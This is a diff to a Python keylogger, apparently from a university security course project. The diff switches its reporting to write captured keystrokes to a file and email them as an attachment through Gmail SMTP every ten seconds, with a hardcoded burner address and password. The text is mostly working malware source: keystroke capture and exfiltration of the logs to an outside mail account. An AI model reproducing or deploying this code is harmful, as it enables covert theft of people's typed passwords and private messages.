@@ -1,10 +1,19 @@
 import keyboard
 import smtplib
+import sys
+import ast
+import mimetypes
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from email.message import Message
+from email.mime.text import MIMEText
 
 from threading import Timer
 from datetime import datetime
 
-REPORT_INTERVAL = 30
+REPORT_INTERVAL = 10
 EMAILA = "cmsc414BH@gmail.com"  # address of burner account to receive reports
 EMAILP = "P@$$word"             # password for burner account
 
@@ -39,7 +48,7 @@ class Keylogger:
             self.endDate = datetime.now()   # add finished timestamp for appending to filename
             self.updateFilename()           # final update to filename before saving/sending
             self.writeFile()                # write current log contents to file
-            self.report_mail(EMAILA, EMAILP, self.log)  # send current log contents as email
+            self.report_mail()              # send current log contents as email
             print(f"[{self.filename}] - {self.log}")    # output filename of processed report
             self.startDate = datetime.now()             # reset start time for next filename
         self.log = ""                       # clear log for next interval
@@ -95,25 +104,34 @@ class Keylogger:
     def updateFilename(self):
         startDateString = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
         endDateString = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog--{startDateString}_to_{endDateString}"
+        self.filename = f"keylog--{startDateString}_to_{endDateString}.txt"
 
     # **************************
     # Write current logged data to txt file
     # **************************
     def writeFile(self):
-        with open(f"G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt", "w") as f:
+        with open(f"c:\\{self.filename}", "w") as f:
             print(self.log, file=f)
         print(
-            f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt")  # confirm file-write
+            f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}")  # confirm file-write
 
     # **************************
     # sends report as email
     # **************************
-    def report_mail(self, email, pw, msg):
+    def report_mail(self):
+        msg = MIMEMultipart()
+        msg['From'] = EMAILA
+        msg['To'] = EMAILA
+        msg['Subject'] = self.filename
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(open(self.filename, "rb").read())
+        encoders.encode_base64(part)
+
+        msg.attach(part)
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # connect to email SMTP server
         server.starttls()                                       # starts TLS mode
-        server.login(email, pw)                                 # logs in to burner email account
-        server.sendmail(email, email, msg)                      # sends mail to itself
+        server.login(EMAILA, EMAILP)                                 # logs in to burner email account
+        server.sendmail(EMAILA, EMAILA, msg.as_string())                      # sends mail to itself
         server.quit()                                           # disconnects from SMTP server
 
 
